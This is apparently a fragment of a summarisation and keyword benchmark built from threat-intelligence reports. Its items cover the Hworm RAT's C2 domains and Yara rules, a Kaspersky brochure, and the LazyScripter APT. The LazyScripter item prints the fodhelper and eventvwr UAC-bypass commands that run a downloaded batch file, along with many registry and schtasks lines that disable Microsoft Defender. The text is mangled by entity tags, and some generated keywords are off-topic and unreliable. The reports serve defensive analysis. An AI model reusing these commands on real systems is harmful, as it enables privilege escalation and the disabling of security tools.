of the [ORG] Hworm malware running in memory . Without a copy of the specific [ORG] Hworm version in the victim system and a Forensics investigation , it is difficult to confirm why those AV tools didn\u02bct remove the sample from those victim system . These findings are another validation of how a layered approach to secure the network enterprise is needed to protect your endpoints from these cyber threats . In order to aid the security community with indicators of the [ORG] Hworm RAT , the following is a list of C2 domains we have seen in the past six months:1cowsound.mooo[dot]comhbooob.no - ip[dot]bizp - dark.zapto[dot]org3bod - x.no - ip[dot]bizhell222.no - ip[dot]bizpilo - raouf.no - ip[dot]biz43r0m4x.publicvm[dot]comherohero.no - ip[dot]orgqalsdahxjnm.no - ip[dot]biz9amoo.zapto[dot]orghussamhack.no - ip[dot]bizqwwq.no - ip[dot]biza.servecounterstrike[dot]comines0049.ddns[dot]netqwwq.servehttp[dot]comaaaazzzz9999000.no - ip[dot]bizj2w2d.no - ip[dot]bizrighi.linkpc[dot]netaabod8.no - ip[dot]bizjeflex.no - ip[dot]orgronaldo-123.no - ip[dot]bizadolf2013.sytes[dot]netjn.redirectme[dot]netsara - tabuk.no - ip[dot]bizah99.no - ip[dot]infojustprogamers.ddns[dot]netservecounterstrike.servecounterstrike[dot]comahmad212.no - ip[dot]bizkhdt1.zapto[dot]orgsmoker21.hopto[dot]orgaktam04.no - ip[dot]infoking0780.no - ip[dot]bizstrangler89.no - ip[dot]orgali252612.zapto[dot]orgking999.ddns[dot]netsupport.microsoft.linkpc[dot]netamran - pc.no - ip[dot]bizkingofus.myq - see[dot]comswanox.no - ip[dot]organarqe77.no - ip[dot]bizklonkino.no - ip[dot]orgsyses.sytes[dot]netanonymous-0.no - ip[dot]bizkohen.no - ip[dot]orgsystim.publicvm[dot]comasdfghj123.ddns[dot]netksa2013.no - ip[dot]bizuniversal2010.no - ip[dot]orgazo8oz.no - ip[dot]bizmastlg.no - ip[dot]bizupdlate.serveminecraft[dot]netbifrost - jordan.zapto[dot]orgmax - ps.sytes[dot]netvipvip3.dyndns[dot]orgcyberspy.zapto[dot]orgmaxy.no - ip[dot]infovipx.zapto[dot]orgdmar123.no - ip[dot]bizmi0.bounceme[dot]networmaa.zapto[dot]orgdoda.redirectme[dot]netmicrosoft8.publicvm[dot]com wvvw.sytes[dot]netdouda.linkpc[dot]netmicrosoftntdll.sytes[dot]netx.dvr - ddns[dot]comdouda.no - ip[dot]infomicrosoftsystem.sytes[dot]net xdz.no - ip[dot]orgdz47.linkpc[dot]netmohamedmmk.zapto[dot]org xxtataxx.no - ip[dot]bizelaspany.ddns[dot]netmouradel.no - ip[dot]orgyahia17.no - ip[dot]orgepohme.no - ip[dot]orgnemlacom.no - ip[dot]izfecabook.redirectme[dot]netnjrat2012.no - ip[dot]bizg00gle.sytes[dot]netnoooot.no - ip[dot]bizgooglechrome.servequake[dot]com ody.no - ip[dot]bizhacker0021.no - ip[dot]bizorg.publicvm[dot]comFrom the above domains , the following one quickly stands out : \u201c njrat2012.no - ip[dot]biz \u201d . The last [ORG] Hworm activity observed at a client site with this domain was on Oct [DATE] 2016 . pDNS data shows that in [DATE] June [DATE] 2016 this domain was associated with [PERSON] Xtreme RAT activity . We also found samples of njRAT configurations using our mining techniques . The following [PERSON] Yara rules can also be used to detect this threat : rule win_vbs_rat_hworm $ sa3 = \" SHELLOBJ.EXPANDENVIRONMENTSTRINGS \" $ sa4 = \" [GPE] BASE64TOHEX \" $ sa5 = \" [PRODUCT] DCOM.VIRTUALALLOC \" $ sa6 = \" LOADER _ \" $ sa7 = \" PE_PTR\"$sa8 = \" OBJWMISERVICE.EXECQUERY \" $ sa9 = \" WSCRIPT.EXE \" nocase $ [PERSON] sa12 = \" END SUB \" ( all of ( $ sa * ) ) and ( ( all of ( $ sb * ) ) or ( all of ( $ sc * ) ) ) $ sa1 = \" connection_host \" wide ascii $ sa2 = \" connection_port \" wide ascii $ sa3 = \" install_folder \" wide ascii $ sa4 = \" install_name \" wide ascii $ sa5 = \" nickname_id \" wide ascii $ sa6 = \" password \" wide ascii $ sa7 = \" injection \" wide ascii $ sa8 = \" startup_registry \" wide ascii $ sa9 = \" startup_folder \" wide ascii $ sa10 = \" startup_task \" wide ascii $ [ORG] sa11 = \" process_name \" wide ascii $ sa12 = \" fkeylogger_host \" wide ascii $ [MONEY] sa13 = \" fkeylogger_port \" wide ascii $ sa14 = \" keylogger_init \" wide ascii $ [MONEY] sa15 = \" keylogger_offline \" wide ascii $ [MONEY] sa16 = \" file_manager \" wide ascii $ [MONEY] sa17 = \" usb \" wide ascii $ [ORG] sa18 = \" password \" wide ascii $ sa19 = \" filemanager \" wide ascii $ [MONEY] sa20 = \" keylogger \" wide ascii $ [ORG] sa21 = \" screenshot \" wide ascii $ [MONEY] sa22 = \" show \" nocase wide ascii $ [MONEY] sa23 = \" open \" wide ascii $ sa25 = \" create \" wide ascii $ [MONEY] sa26 = \" Self \" wide ascii $ sa27 = \" createsuspended \" wide ascii condition:(uint16(0 ) = = [CARDINAL] 0x5A4D ) and ( all of them )", "generated_text": "Fidelis Cybersecurity; commodity remote access trojans; H-W0rm; njRAT; KilerRAT; DarkComet; XtremeRAT; Netwire; XtremeRAT; JSocket; AlienSpy; Adwind; the malware; domains; Yara rules; a proxy server; SSH; a command; control; server; server; the Hworm; Yara rules; the RAT; the RAT; a new version; a ransomware name; a commodity RAT; the malware; a unique RAT; variants; time; tools; the RAT; a change; the payload; a higher-value; the threat; threat intelligence.", "ref_text": "<START-1>The PDF discusses the capabilities and recent activity of a Remote Access Trojan (RAT) malware called H-W0rm (also known as Hworm). H-W0rm gives attackers remote access and control over infected computers. Some key points: H-W0rm has classic RAT capabilities like collecting system info, file manager, keylogger, webcam/microphone access, etc. It allows adversaries to fully control infected systems. Research suggests the developer \"Houdini\" may have connections to the developer of other RATs like njRAT and BlackWorm. The PDF provides a list of over 100 Hworm command and control domains that were active in infections over the past 6 months. Many domains overlap with other RATs like XtremeRAT. The PDF includes Yara rules to detect Hworm and also enriches the Fidelis Barncat database with new Hworm configurations to aid security researchers. Hworm versions have been seen avoiding detection by antivirus tools installed on victim machines, like Microsoft Security Essentials. The PDF provides technical analysis into Hworm's capabilities and builder tool, showing how it can be customized for different campaigns. Videos demonstrate the builder interface. Hworm is seen across enterprise verticals globally, making it one of the most active RATs. The PDF aims to provide intel to security teams to help detect and stop this threat. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4458204334365325, "gpt3/lexical/rouge_rouge2": 0.14953271028037382, "gpt3/lexical/rouge_rougeL": 0.21671826625386997, "gpt3/lexical/rouge_rougeLsum": 0.21671826625386997, "gpt3_generated_text": ["The article discusses the presence and activity of commodity remote access trojans (RATs), specifically focusing on the H-W0rm RAT. The Threat Research Team at Fidelis Cybersecurity provides technical descriptions of the payload behavior of H-W0rm and identifies the domains associated with active infections. They also share a dataset through Fidelis Barncat, a malware configuration intelligence database. The article clarifies that H-W0rm is not a typical worm but a remote access trojan with capabilities to fully control infected systems. The article also mentions the presence of a builder tab that suggests the potential for future exploits. The H-W0rm RAT is believed to have connections with other RATs such as njRAT and njw0rm."]}, {"split_name": "test", "sample_id": "test_11", "prompt_text": "Extract the keywords: Secure Hyper Converged infrastructure with [ORG] Kaspersky [ORG] Security for [WORK_OF_ART] VirtualizationAdvanced [WORK_OF_ART] Cybersecurity For [PERSON] Nutanix platformMulti - layered Protection for Any VirtualizationWhile virtualization can improve IT agility and efficiency , it also adds more layers of technology . Maintaining full visibility for each layer \u2013 and how they interact \u2013 can be difficult . And more layers generally means more \u2018 attack surfaces \u2019 , increasing the ways in which cybercriminals can attack your business . Together , [PERSON] Nutanix and [PERSON] Kaspersky [PERSON] Lab deliver a secure , scalable compute and storage solution for virtualized applications . [GPE] Virtual servers and desktops running on [PERSON] Nutanix nodes are protected by powerful [ORG] Kaspersky [ORG] Security for Virtualization solution , while preserving all the performance benefits that virtualization brings . It \u2019s a winning combination for an optimized environment . Security That Works Closely With Your ITA Security Virtual Machine ( [ORG] SVM ) on each host scans all VMs centrally , while a powerful but lightweight agent deployed on each VM allows advanced security features , including anti - cryptor , memory and processes protection , application , device and web controls , anti - malware protection for [ORG] IM , mail and web , plus advanced heuristics together with [ORG] Automatic [ORG] Exploit [ORG] Prevention , to be activated . In agentless configuration , [ORG] Kaspersky [ORG] Security for Virtualization integrates natively with [ORG] VMware NSX . With no additional agent required on each VM , systems impact on virtual platform performance is near - zero , administration is reduced , and each VM is protected instantaneously . Kaspersky Security for Virtualization supports and integrates with most popular virtualization platforms , including [ORG] VMware [ORG] vSphere , [PERSON] Microsoft Hyper [PERSON] - V and KVM . Your business critical infrastructure benefits from optimized performance that fully exploits your hypervisor \u2019s own core technologies \u2013 complementing and enhancing security in , for example , [ORG] VMware [ORG] Horizon and Citrix XenDesktop [ORG] VDI environments . [ORG] Kaspersky [ORG] Security [ORG] for Virtualization adds powerful multi- layered protection with the lightest of resource footprints , resulting in a significantly higher machine density than traditional anti - malware solutions can deliver . So you can effectively protect your systems and sensitive corporate data , while maintaining high consolidation ratios and quality of service for your users . [ORG] SERVERDESKTOPVIRTUALIZATIONVIRTUALIZATIONCLOUDPROVIDERSKaspersky [ORG] Security [ORG] for [ORG] Virtualization [ORG] Light [ORG] Agent and [ORG] Agentless . [CARDINAL] Two approaches in [CARDINAL] one solution , delivering powerful protection combined with efficient performance for your virtual environment . Light Agent \u2022 Anti - malware for servers and [ORG] VDI [ORG] \u2022 [ORG] Memory and process protection \u2022 Apps , device and web controls \u2022 [ORG] IM , mail and web anti - malware \u2022 Security for Windows and [ORG] LinuxSecurity [ORG] Virtual [ORG] Machine [ORG] \u2022 Full scanning AV - engine \u2022 O(cid:15)oads anti - malware tasks \u2022 Redundancy and fault - tolerance \u2022 [ORG] Cache - based optimization \u2022 [NORP] Preserves hypervisor resourcesVMVMVMVMVMSVMFigure [CARDINAL] 1 . Architecture of KSV Light Agent on [GPE] NutanixFor virtualized environments , maintaining security without affecting performance is critical . [ORG] Kaspersky [ORG] Security [ORG] for [ORG] Virtualization uses patented technologies to strengthen the protection of [ORG] VDI and server platforms at individual VM ( virtual machine ) level , with minimal impact on performance . [PERSON] Kaspersky \u2019s award - winning anti - malware engine provides automatic , real - time protection for every VM on most popular virtualization platforms including [ORG] VMware [ORG] vSphere and [PERSON] Microsoft Hyper [PERSON] - V.Per VM licensing examples : [PERSON] Nutanix PlatformVM , [PERSON] Qty and typeKSV licensesAny [QUANTITY] Platform400 [QUANTITY] x [PRODUCT] VDI400 x [ORG] KSV . [ORG] DesktopAny Platform200 x Servers200 x KSV , [ORG] ServerPer [ORG] Core licensing examples : Packaging and [ORG] LicensingNutanix [ORG] PlatformCores [ORG] Per NodeKSV licensesYou may deploy both Agentless and Light Agent security at the same time with a single licensing key . This give you a flexibility in how you protect your business critical environment . You simply choose a licensing scheme convenient for you and your infrastructure . NX-1065S - G58 or [CARDINAL] 128 or [CARDINAL] 12 x KSV , CoreNX-3060 [ORG] - G516 [ORG] - [ORG] 3616 [ORG] - [ORG] 36 x [ORG] KSV , CoreNX-3155 - G516 - 3616 - 36 x [ORG] KSV , CoreNOT SURE WHAT IS HERE CONTROL WHAT IS HERENX-3175 [NORP] - G524 - 4424 - 44 x KSV , CoreVMVMVMVMVMVMVMVMVMVMorDO NOT CARE WHAT IS HERE KNOW EXACTLY WHAT IS [ORG] HEREPER [ORG] COREPER [ORG] VMYou license only physical coresYou license based on VM quantityFor more information about [ORG] Kaspersky [ORG] Security [ORG] for [ORG] Virtualization , visit url x KSV , [GPE] CoreNX-6035 - G516 or [DATE] 2016 or [CARDINAL] 20 x [ORG] KSV , CoreNX-6155 [ORG] - G52828 x KSV , CoreNX-8035 - G512 - 3612 - 36 x [ORG] KSV , CoreNX-8150 [PERSON] - G516 [PERSON] - [PERSON] 4416 [PERSON] - [PERSON] 44 x KSV , CoreNote : Both Agentless and Light Agent protection options are available under a single license . You only need to choose a convenient licensing scheme for your environment . [PERSON] Kaspersky [PERSON] Lab [PERSON] Enterprise [PERSON] Cybersecurity : www.kaspersky.com/enterprise Cyber Threats News : www.securelist.com IT Security News : business.kaspersky.com/#truecybersecurity # HuMachine", "generated_text": "Kaspersky Security; Virtualization; Nutanix; a cost-effective solution; security; sensitive corporate data; VMware NSX; SVMs; light agent; adaptive vulnerability prevention; IPS; every VM; multiple layers; NAT; multi-layered protection; TS; VDI; the NI; ivm; exploits; arbitrary privileges; obfuscation; compromise; the Kubernetes Cluster; Kubernetes Image Cluster; parallel; VMware NSX; ivm.", "ref_text": "<START-1>The document describes how Kaspersky Security for Virtualization (KSV) provides advanced cybersecurity protection for Nutanix hyperconverged infrastructure environments. KSV utilizes a Security Virtual Machine (SVM) on each host that centrally scans all VMs, along with a lightweight agent on each VM enabling advanced security features. This architecture delivers protection with minimal impact on performance. In agentless mode, KSV natively integrates with VMware NSX, removing the need for an agent on each VM and providing instant protection. KSV supports major virtualization platforms like VMware, Hyper-V, and KVM. It provides multi-layered security optimized for virtual environments, resulting in high machine density. Two deployment options are available: Light Agent or Agentless. Both utilize patented Kaspersky technologies to protect VMs with minimal performance impact. KSV can be licensed either per-core, based on physical cores in Nutanix nodes, or per-VM, based on the number of VMs requiring protection. A single license key provides flexibility to deploy Light Agent and Agentless security together. In summary, the document outlines how KSV is designed to deliver advanced but lightweight security optimized for Nutanix and other major virtualization platforms, with flexible licensing options. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4812834224598931, "gpt3/lexical/rouge_rouge2": 0.13978494623655913, "gpt3/lexical/rouge_rougeL": 0.25133689839572193, "gpt3/lexical/rouge_rougeLsum": 0.25133689839572193, "gpt3_generated_text": ["This article discusses the benefits of using Kaspersky Security for Virtualization in combination with the Nutanix platform to ensure secure and efficient virtualized environments. With the increasing complexity of virtualization technology, maintaining visibility and security across all layers can be challenging. By integrating Kaspersky's advanced cybersecurity solutions with Nutanix's compute and storage capabilities, businesses can protect their virtual servers and desktops without compromising performance. Kaspersky Security for Virtualization offers a range of security features, including anti-malware protection, memory and process protection, application controls, and web controls. It can be deployed with a lightweight agent on each virtual machine or integrated natively with VMware NSX in an agentless configuration. The solution supports popular virtualization platforms such as VMware vSphere, Microsoft Hyper-V, and KVM. It offers multi-layered protection with minimal resource impact, allowing businesses to maintain high consolidation ratios and quality of service. The article also provides licensing examples and highlights the flexibility of using both agentless and light agent security simultaneously. Overall, Kaspersky Security for Virtualization provides a cost-effective and efficient solution for securing virtual environments and protecting sensitive corporate data."]}, {"split_name": "test", "sample_id": "test_12", "prompt_text": "Extract the keywords: Threat Intelligence ReportLazyScripter : From [GPE] Empire to double RATHossein [PRODUCT] JaziFebruary [PRODUCT] 20211Table of ContentsExecutive Summary 3Introduction 4 13Timeline of activities and phishing lures Document analysis Archive analysisKOCTOPUS Analysis 15 Registry key variant EmpoderInfrastructure 35Attribution 36Conclusion 37Indicators of Compromise ( IOCs ) [CARDINAL] 38MITRE ATT&CK techniques [CARDINAL] 422February 2021Executive SummaryMalwarebytes \u2019 Threat Intelligence analysts are continually researching and monitoring active malware campaigns and actor groups as the prevalence and sophistication of targeted attacks rapidly evolves . In this paper , we introduce a new [ORG] APT group we have named LazyScripter , presenting in - depth analysis of the tactics , techniques , procedures , and infrastructure employed by this actor group . Although the observed TTPs have commonality with known actor groups , there are many notable differences setting LazyScripter apart from these groups ; these similarities and differences are discussed in the Attribution section of this paper . [ORG] APT groups are traditionally tracked according to specific targets and tools or methodologies they employ . Many actor groups use spam campaigns , attaching weaponized documents to phishing emails themed to target the industry or demographic of interest . In this case , we initially discovered a number of malicious emails specificallytargeting individuals seeking employment , which prompted a deeper investigation . Digging deeper we uncovered a targeted spam campaign dating back [CARDINAL] as [CARDINAL] far [CARDINAL] as [DATE] 2018 using phishing lures with themes aimed not only at those seeking immigration to [GPE] Canada for employment , but also at airlines . In the following analysis , we walk through the timeline of observed TTPs from the initial phishing campaign to the state of the current and ongoing activities of the actor . We take a deep dive into each of the tools used , including the weaponized documents and the multiple variants of malware and exploitation techniques employed . Finally , we detail the infrastructure used and discuss the attribution comparisons with known actor groups such as [GPE] APT28 and [PERSON] Muddy [PERSON] Water . This in - depth and detailed analysis has revealed a developing campaign by what we believe to be a previously unidentified [ORG] APT actor . Not only has this campaign been active for [DATE] several [DATE] years , but ongoing tracking shows this actor is still maintaining the infrastructure used and is actively updating toolsets . For this reason , we continue to track this new group [ORG] LazyScripter as the threat evolves.3IntroductionIn [DATE] late [DATE] December [DATE] 2020 we observed a few malicious documents with embedded objects that were designed to target job seekers . The embedded objects were either [ORG] VBScript or batch files that deployed [CARDINAL] two open- source multi - stage [LAW] Remote [LAW] Access [LAW] Trojans ( RATs ): Octopus and [ORG] Koadic . Interestingly , in some cases the attacker managed to drop other RATs such as [PERSON] LuminosityLink , RMS , Quasar , njRat and [GPE] Remcos . This triggered our interest to further investigate this threat actor to understand its activities over [DATE] the [DATE] past [DATE] few [DATE] years . We were able to track them back to at least [DATE] 2018 with a campaign targeting victims looking to immigrate to [GPE] Canada . Over time they have used different file types as their initial lures , and they have switched their main toolset from [ORG] PowerShell [ORG] Empire to double [ORG] RAT ( [ORG] Koadic and Octopus).This threat actor is targeting [ORG] the [ORG] International [ORG] Air [ORG] Transport [ORG] Association ( [ORG] IATA ) and airlines in which we observed several different lures specifically designed to target airlines that are using the BSPLink software . Most recently we observed that they have changed their lure to mimic a new feature recently introduced by [ORG] IATA called [ORG] IATA [ORG] ONE [ORG] ID ( Contactless Passenger Processing tool ) . This indicates that this actor is constantly updating its toolsets to target new systems developed by [ORG] IATA.4PhishingIn all their phishing lures the actor has used its loader to spawn a combination of [ORG] Octopus and [PERSON] Koadic ( there were only a few cases with [ORG] Koadic only ) . We were able to identify several different variants of this loader : executable , batch , [ORG] VBScript , and registry files ( in which persistence is achieved by writing a [ORG] PowerShell script into the [ORG] AutoRun registry key ) . We named this new loader as [ORG] KOCTOPUS.This group also has used another loader around [DATE] 2018 and [DATE] 2019 to load [PERSON] PowerShell [PERSON] Empire . We named this loader [PERSON] Empoder . As a phishing lure they mainly used either IATA- or job - related themes to target victims . However , we have observed several other phishing lures that have been used by this actor . Here are some of them : [ORG] IATA security ( [ORG] International [ORG] Air [ORG] Transport [ORG] Association security)\u2022 \u2022 BSPlink Updater or [PERSON] Upgrade ( [ORG] BSPlink is the global interface for travel agents and airlines to access theIATA Billing and Settlement Plan ( BSP ) ) . IATA ONE IDTourism ( UNWTO)\u2022 \u2022 User support kits for [ORG] IATA users \u2022 [GPE] Canada skill worker program \u2022 Canada Visa ( CanadaVisa.com is the online presence of the Campbell Cohen Immigration Law Firm)Job informationAnother interest of this actor is targeting people that want to immigrate to [GPE] Canada through government job- related programs . In [CARDINAL] one of the specific cases the actor has used the legitimate \" Canadavisa.com \" site as its phishing lure . [PERSON] Canadavisa is a known [NORP] Canadian immigration website associated with an immigration firm based in [GPE] Montreal , [GPE] Canada . This actor has mainly used spam emails weaponized with either archive or document files as it is initial infection vector . Both zip and document files contain a variant of either [PERSON] KOCTOPUS or [ORG] Empoder and in some cases they are password protected . The actor has mainly used [CARDINAL] two [ORG] GitHub accounts to host its toolsets . Both of these accounts were deleted on [DATE] Jan [DATE] 12 and [DATE] 14 [DATE] 2021 , respectively.\u2022 url \u2022 url [CARDINAL] 1 : GitHub account belonging to threat actorThe actor created a new [ORG] GitHub account on [DATE] Feb [DATE] 2nd [DATE] 2021 to host its payloads to operate its new spam campaign : Figure [CARDINAL] 2 : New GitHub repositoryTimeline of activities and phishing luresWe were able to collect some of the spam emails used by this actor over [DATE] the [DATE] past [DATE] two [DATE] years . In these spam emails the actor used several methods to redirect the user to download a variant of [ORG] KOCTOPUS . The latest campaign was spotted on [DATE] Feb 5th , [DATE] 2021 in which the actor was distributing a variant of [ORG] KOCTOPUS pretending to be \u201c BSPLink Upgrade.exe \u201d and managed to drop a variant of Quasar Rat in addition to [ORG] OCTOPUS and [ORG] Koadic . Prior to that we have spotted another campaign on [DATE] Jan 6th , [DATE] 2021 in which the actors were distributing a variant of [ORG] KOCTOPUS pretending to be \u201c IATA ONE ID.exe \u201d software:6Figure [CARDINAL] 3 : Latest spam campaignHere is the list of different lures used by this actor : Figure [CARDINAL] 4 : Latest spam campaign\u2022KOCTOPUS has been archived and distributed as an email attachment to victims.7Figure [CARDINAL] 5 : Spam email variant [CARDINAL] 1\u2022The spam email contains a [ORG] PDF file with a link to download a variant of KOCTOPUS.Figure [CARDINAL] 6 : Spam email variant 2Figure 7 : Spam email variant 38Figure [CARDINAL] 8 : Attached [ORG] PDF file\u2022The spam email contains a link that redirects the victim to download [ORG] KOCTOPUS or a maldoc that has an embedded [ORG] KOCTOPUS . The link usually is a URL shortener link using shortener services such as bit.ly or cutt.ly that redirects victims to either the attackers \u2019 [PERSON] Github repository or the [ORG] IP / URL address that hosts the maldoc . Figure [CARDINAL] 9 : Spam email variant 3On [DATE] March [DATE] 19th [DATE] 2020 , SANS ISC InfoSec Forums reported a multistage attack that took advantage of the COVID-19 pandemic to distribute its malware . This reported maldoc contains a variant of the [ORG] KOCTOPUS malware we uncovered in this paper . In that phishing email the actor spoofed [ORG] the [ORG] World [ORG] Health [ORG] Organization and pretends to provide recommendations . We were able to identify multiple themes used by this actor and the time they have been used in spam campaigns . The following image shows the time frames of the different lures used by the actor.9Figure [CARDINAL] 10 : Lures timeline10Document analysisUnlike most actors that are using macros in their documents to perform malicious activities , this actor has embedded objects that are [CARDINAL] one of the [ORG] KOCTOPUS or Empoder variants . We identified [CARDINAL] 14 malicious documents that have been used by this actor since [DATE] 2018 : Figure [CARDINAL] 11 : List of maldocs used by this actorThe malicious documents usually have [CARDINAL] one or [CARDINAL] two embedded objects with either [ORG] PDF , [ORG] Microsoft [ORG] Word or [PRODUCT] Excel icons to pretend they are another document embedded in the doc while in fact they are either batch , executable , or VBScript variants of [ORG] KOCTOPUS or Empoder.11Figure [CARDINAL] 12 : [ORG] Doc [ORG] Template [ORG] 112Figure 13 : [ORG] Doc [ORG] Template [ORG] 2Archive analysisThe actor has not only relied on maldocs to deliver its loaders but also used archive files that have embedded a variant of [ORG] KOCTOPUS or [ORG] Empoder . The following shows the list of archive lures used by this actor since [DATE] 2018:13Figure [DATE] 14 : List of archive files and their embedded objects14KOCTOPUS [ORG] AnalysisThe actor has used this loader to load [PRODUCT] Octopus and [ORG] Koadic and in some cases other RATs such as [PERSON] LuminosityLink RMS and [PERSON] Quadar RAT . This loader has [CARDINAL] four different variants which we will describe below . [PERSON] Batch [PERSON] VariantThe batch files used by this actor are highly obfuscated with the [ORG] BatchEncryption tool . [ORG] BatchEncryption is an advanced batch obfuscation tool that uses a combination of known and custom environment variable encoding techniques . In this section we provide the analysis of a batch file embedded within the most recent maldoc used by this actor . The following shows the obfuscated version of [ORG] KOCTOPUS : Figure [CARDINAL] 15 : Overall ProcessFigure [CARDINAL] 17 shows the list of commands that will be executed by this loader after de - obfuscation . Figure [CARDINAL] 16 : [PERSON] KOCTOPUS [PERSON] Batch [PERSON] Variant [PERSON] ObfuscatedFigure [CARDINAL] 17 : KOCTOPUS Batch Variant Not Obfuscated15This loader starts it activities by checking the OS version using the following command : for /f \" tokens=2 [DATE] delims= , \" % % i in ( ' wmic os get caption^,version / format : csv ' ) do set os=%%iThen it looks for [CARDINAL] number [CARDINAL] 10 using the find command to identify if the OS is Windows 10 . If that is the case , it attempts to bypass [ORG] User [ORG] Access [ORG] Control ( [ORG] UAC ) using fodhelper.exe and execute its commands with higher privilege . If the OS version is not [CARDINAL] 10 , it performs [ORG] UAC bypass through [ORG] Event [ORG] Viewer ( eventvwr.exe).Fodhelper.exe has been used in Windows 10 to manage language settings . Since this process is running with highest privilege , an attacker can abuse it to execute its malicious commands with the same privilege fodhelper has . When the fodhelper.exe process starts it looks for the [CARDINAL] three registry keys shown below that by default do not exist . Therefore , an attacker can write its malicious commands in these registry keys to be executed by fodhelper.exe with the highest privilege . HKCU:\\Software\\Classes\\ms - settings\\shell\\open\\command HKCU:\\Software\\Classes\\ms - settings\\shell\\open\\command\\DelegateExecute HKCU:\\Software\\Classes\\ms - settings\\shell\\open\\command\\(default)This loader has created these registry keys with a [ORG] PowerShell command : & & reg add HKCU\\Software\\Classes\\ms - settings\\shell\\open\\command /v \" [WORK_OF_ART] DelegateExecute \" /f & & reg add HKCU\\Software\\Classes\\ms- settings\\shell\\open\\command /d \" cmd.exe /c powershell -WindowStyle [GPE] Hidden - command [ORG] \\\"IEX ( New [ORG] - Object [ORG] ' C:\\Users\\Public\\Libraries\\sc.bat');\\ \" C:\\Users\\Public\\Libraries\\sc.bat \" /fTo execute the [ORG] PowerShell command , fodhelper.exe needs to be executed : & & [ORG] START /W fodhelper.exeUpon fodhelper execution , [ORG] PowerShell is executed to download a batch file from a remote server and save it into the [GPE] Libraries directory and finally execute it . At the end the loader performs the cleanup procedure by deleting the created registry keys with the following command : & & reg delete HKCU\\Software\\Classes\\ms - settings /fIf the OS version is not [CARDINAL] 10 , [PERSON] Event [PERSON] Viewer is used to bypass [ORG] UAC . When [PERSON] eventvwr.exe is executed it looks for mmc.exe in these [CARDINAL] two registry locations : [PERSON] HKCU\\Software\\Classes\\mscfile\\shell\\open\\command [PERSON] HKCR\\mscfile\\shell\\open\\commandSince the [ORDINAL] first registry key does not exist then mmc.exe is executed from the [ORDINAL] second location to load the eventvwr.msc file in order to display the information to the user . An attacker can create this registry key that does n\u2019t exist in order to execute malicious commands with administrative privileges . In this case the actor has created this registry key with the same [ORG] PowerShell command as described in the fodhelper.exe bypass.reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \" cmd.exe /c powershell -WindowStyle Hidden -command \\\"IEX ( New [ORG] - Object [ORG] ' C:\\Users\\Public\\Libraries\\sc.bat');\\ \" C:\\Users\\Public\\Libraries\\sc.bat \" /f16The downloaded batch file ( sc.bat ) has also been obfuscated using the [ORG] BatchEncryption tool . After deobfuscation we can see this batch performs the following steps:\u2022 Using reg.exe to disable , add or delete all registry keys related to [ORG] Microsoft [ORG] Defender and [ORG] MicrosoftSecurity [ORG] Essentials . Also , it disables all the Scheduled tasks related to these security products by calling schtasks : reg delete \" [WORK_OF_ART] HKLM\\Software\\Policies\\Microsoft\\Windows [WORK_OF_ART] Defender \" /f reg add \" [WORK_OF_ART] HKLM\\Software\\Policies\\Microsoft\\Windows [WORK_OF_ART] Defender \" /v \" DisableAntiSpyware \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" [WORK_OF_ART] HKLM\\Software\\Policies\\Microsoft\\Windows [WORK_OF_ART] Defender \" /v \" DisableAntiVirus \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" [WORK_OF_ART] HKLM\\Software\\Policies\\Microsoft\\Windows [WORK_OF_ART] Defender\\MpEngine \" /v \" [ORG] MpEnablePus \" /t REG_DWORD /d \" 0 \" /f reg add \" HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real [ORG] - Time [ORG] Protection \" /v \" DisableBehaviorMonitoring \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real [ORG] - Time [ORG] Protection \" /v \" DisableIOAVProtection \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real [ORG] - Time [ORG] Protection \" /v \" DisableOnAccessProtection \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real [ORG] - Time [ORG] Protection \" /v \" DisableRealtimeMonitoring \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real [ORG] - Time [ORG] Protection \" /v \" DisableScanOnRealtimeEnable \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting \" /v \" [WORK_OF_ART] DisableEnhancedNotifications \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" [WORK_OF_ART] HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet \" /v \" DisableBlockAtFirstSeen \" /t REG_DWORD /d \" [CARDINAL] 1 \" /f reg add \" [WORK_OF_ART] HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet \" /v \" [WORK_OF_ART] SpynetReporting \" /t REG_DWORD /d \" 0 \" /f reg add \" [WORK_OF_ART] HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet \" /v \" SubmitSamplesConsent \" /t REG_DWORD /d \" 0 \" /f reg add \" HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger \" /v \" Start \" /t REG_DWORD /d \" 0 \" /f reg add \" HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger \" /v \" Start \" /t REG_DWORD /d \" 0 \" /f schtasks /Change /TN \" Microsoft\\Windows\\ExploitGuard\\ExploitGuard [ORG] MDM policy [PERSON] Refresh \" /Disable schtasks /Change /TN \" Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance \" /Disable schtasks /Change /TN \" Microsoft\\Windows\\Windows Defender\\Windows [PERSON] Defender [PERSON] Cleanup \" /Disable schtasks /Change /TN \" Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled [NORP] Scan \" /Disable schtasks /Change /TN \" Microsoft\\Windows\\Windows Defender\\Windows Defender \" HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run \" /v \" [WORK_OF_ART] Windows [WORK_OF_ART] Defender \" /f reg delete \" 